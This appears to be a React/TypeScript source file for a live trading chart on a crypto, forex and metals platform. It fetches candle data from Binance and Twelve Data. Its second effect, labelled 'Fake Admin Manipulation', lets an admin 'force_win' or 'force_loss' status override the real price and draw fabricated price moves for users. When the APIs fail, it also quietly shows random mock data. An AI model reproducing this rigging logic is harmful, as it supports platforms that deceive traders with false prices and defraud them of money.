"use client";
import { useEffect, useRef, useState } from "react";
import { createChart, ColorType, CandlestickSeries, LineSeries, UTCTimestamp, ISeriesApi } from "lightweight-charts";
import { Loader2 } from "lucide-react";

// Memory Cache: Component re-mount hone par data zaya nahi hoga
const chartDataCache: Record<string, any[]> = {};

interface TradingChartProps {
  symbol: string; 
  assetType: 'crypto' | 'forex' | 'metal'; 
  activeTimeframe?: string; 
  adminControlStatus?: 'normal' | 'force_win' | 'force_loss';
  currentLivePrice?: number; 
}

const getBinanceTimeframe = (tf: string) => tf === 'Line' ? '1d' : tf;
const getTwelveDataTimeframe = (tf: string) => {
  if (tf === 'Line' || tf === '1d') return '1day';
  if (tf === '1h') return '1h';
  if (tf.includes('m')) return tf.replace('m', 'min'); 
  return '15min'; 
};

const generateMockData = (basePrice: number) => {
  const data = [];
  let current = basePrice > 0 ? basePrice : 1.1000; 
  const now = Math.floor(Date.now() / 1000);
  for(let i=100; i>=0; i--) {
     const open = current;
     const close = current + (Math.random() - 0.5) * (current * 0.005);
     const high = Math.max(open, close) + Math.random() * (current * 0.002);
     const low = Math.min(open, close) - Math.random() * (current * 0.002);
     data.push({ time: (now - (i * 60 * 15)) as UTCTimestamp, open, high, low, close, value: close });
     current = close; 
  }
  return data;
}

export default function TradingChart({ 
  symbol = "BTCUSDT", 
  assetType = "crypto", 
  activeTimeframe = "15m",
  adminControlStatus = "normal",
  currentLivePrice = 1.1000 
}: TradingChartProps) {
  const chartContainerRef = useRef<HTMLDivElement>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // VIP Fix: Keep references to update data dynamically without re-rendering chart
  const seriesRef = useRef<ISeriesApi<"Candlestick"> | ISeriesApi<"Line"> | null>(null);
  const lastCandleRef = useRef<any>(null);

  // 1. CHART INITIALIZATION & HISTORICAL DATA FETCHING
  // Isme currentLivePrice nahi hai, ye sirf tab chalega jab coin ya timeframe change ho
  useEffect(() => {
    if (!chartContainerRef.current) return;

    const chart = createChart(chartContainerRef.current, {
      layout: { background: { type: ColorType.Solid, color: "transparent" }, textColor: "#64748b" },
      grid: { vertLines: { color: "rgba(30, 41, 59, 0.4)" }, horzLines: { color: "rgba(30, 41, 59, 0.4)" } },
      width: chartContainerRef.current.clientWidth,
      height: 300,
      timeScale: { timeVisible: true, borderVisible: false },
      rightPriceScale: { borderVisible: false },
      crosshair: { vertLine: { color: "#94a3b8", width: 1, style: 1 }, horzLine: { color: "#94a3b8", width: 1, style: 1 } },
    });

    let series: ISeriesApi<"Candlestick"> | ISeriesApi<"Line">;

    if (activeTimeframe === 'Line') {
      series = chart.addSeries(LineSeries, {
        color: '#FCD535', lineWidth: 2, crosshairMarkerVisible: true, crosshairMarkerRadius: 4,
        crosshairMarkerBorderColor: '#0F172A', crosshairMarkerBackgroundColor: '#FCD535',
      });
    } else {
      series = chart.addSeries(CandlestickSeries, {
        upColor: "#10b981", downColor: "#f43f5e", borderVisible: false, wickUpColor: "#10b981", wickDownColor: "#f43f5e",
      });
    }
    
    seriesRef.current = series;

    const loadChartData = async () => {
      const cacheKey = `${symbol}_${activeTimeframe}`;
      let rawData: any[] = [];
      
      if (chartDataCache[cacheKey]) {
        rawData = [...chartDataCache[cacheKey]];
        series.setData(rawData);
        lastCandleRef.current = { ...rawData[rawData.length - 1] };
        chart.timeScale().fitContent();
        setIsLoading(false);
      } else {
        setIsLoading(true);
        setError(null);

        try {
          if (assetType === 'crypto') {
            const cleanSymbol = symbol.replace('/', ''); 
            const interval = getBinanceTimeframe(activeTimeframe);
            
            const res = await fetch(`https://api.binance.com/api/v3/klines?symbol=${cleanSymbol}&interval=${interval}&limit=100`);
            if (!res.ok) throw new Error("Binance API error");
            
            const data = await res.json();
            rawData = data.map((d: any) => ({
              time: (d[0] / 1000) as UTCTimestamp,
              open: parseFloat(d[1]),
              high: parseFloat(d[2]),
              low: parseFloat(d[3]),
              close: parseFloat(d[4]),
              value: parseFloat(d[4])
            }));
          } else {
            const interval = getTwelveDataTimeframe(activeTimeframe);
            const apiKey = process.env.NEXT_PUBLIC_TWELVEDATA_API_KEY;
            
            if (!apiKey || apiKey === 'undefined') throw new Error("Missing API Key");

            const res = await fetch(`https://api.twelvedata.com/time_series?symbol=${symbol}&interval=${interval}&apikey=${apiKey}&outputsize=100`);
            const data = await res.json();
            
            if (data.status === "error") throw new Error(data.message);
            
            rawData = data.values.reverse().map((d: any) => ({
              time: (new Date(d.datetime).getTime() / 1000) as UTCTimestamp,
              open: parseFloat(d.open),
              high: parseFloat(d.high),
              low: parseFloat(d.low),
              close: parseFloat(d.close),
              value: parseFloat(d.close)
            }));
          }

          chartDataCache[cacheKey] = rawData;
          series.setData(rawData);
          lastCandleRef.current = { ...rawData[rawData.length - 1] };
          chart.timeScale().fitContent();

        } catch (err: any) {
          console.warn("API Failed, using Mock Data:", err.message);
          rawData = generateMockData(currentLivePrice);
          chartDataCache[cacheKey] = rawData;
          series.setData(rawData);
          lastCandleRef.current = { ...rawData[rawData.length - 1] };
          chart.timeScale().fitContent();
        } finally {
          setIsLoading(false);
        }
      }
    };

    loadChartData();

    const handleResize = () => {
      if (chartContainerRef.current) chart.applyOptions({ width: chartContainerRef.current.clientWidth });
    };
    window.addEventListener("resize", handleResize);

    return () => {
      window.removeEventListener("resize", handleResize);
      chart.remove();
      seriesRef.current = null;
    };
  }, [symbol, assetType, activeTimeframe]); // <-- Removed currentLivePrice from here

  // 2. LIVE PRICE UPDATE & ADMIN MANIPULATION
  // Ye block sirf tab chalega jab WebSocket se nayi price aayegi ya admin control change hoga
  useEffect(() => {
    if (!seriesRef.current || !lastCandleRef.current || currentLivePrice <= 0) return;

    const currentCandle = { ...lastCandleRef.current };
    
    // Normal Live Update
    if (adminControlStatus === 'normal') {
      currentCandle.close = currentLivePrice;
      currentCandle.value = currentLivePrice;
      if (currentLivePrice > currentCandle.high) currentCandle.high = currentLivePrice;
      if (currentLivePrice < currentCandle.low) currentCandle.low = currentLivePrice;
    } 
    // Fake Admin Manipulation
    else {
      const volatility = assetType === 'crypto' ? (currentCandle.close * 0.0005) : (currentCandle.close * 0.0001); 
      if (adminControlStatus === 'force_loss') {
        currentCandle.close -= volatility;
        if(currentCandle.close < currentCandle.low) currentCandle.low = currentCandle.close;
      } else if (adminControlStatus === 'force_win') {
        currentCandle.close += volatility;
        if(currentCandle.close > currentCandle.high) currentCandle.high = currentCandle.close;
      }
      currentCandle.value = currentCandle.close;
    }

    // Update the chart visual instantly
    seriesRef.current.update(currentCandle);
    // Save updated state back to reference
    lastCandleRef.current = currentCandle;

  }, [currentLivePrice, adminControlStatus, assetType]); // <-- Runs purely on price ticks

  return (
    <div className="relative w-full h-[300px]">
      {isLoading && (
        <div className="absolute inset-0 flex items-center justify-center z-10 bg-[#020617]/50 backdrop-blur-sm">
          <Loader2 className="animate-spin text-emerald-500" size={32} />
        </div>
      )}
      {error && (
        <div className="absolute inset-0 flex items-center justify-center z-10">
          <p className="text-rose-500 text-xs font-bold">{error}</p>
        </div>
      )}
      <div ref={chartContainerRef} className="w-full h-full" />
    </div>
  );
}